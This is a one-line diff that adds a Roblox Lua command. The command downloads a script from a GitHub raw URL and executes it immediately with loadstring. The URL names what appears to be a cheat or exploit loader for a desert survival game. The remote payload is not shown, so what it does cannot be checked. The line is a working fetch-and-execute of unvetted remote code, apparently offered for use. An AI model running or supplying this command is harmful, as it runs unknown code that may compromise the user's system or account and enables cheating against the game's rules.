@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/upd-survive-7-days-in-desert-spam7-vfci1prfoc9ajf.lua"))()
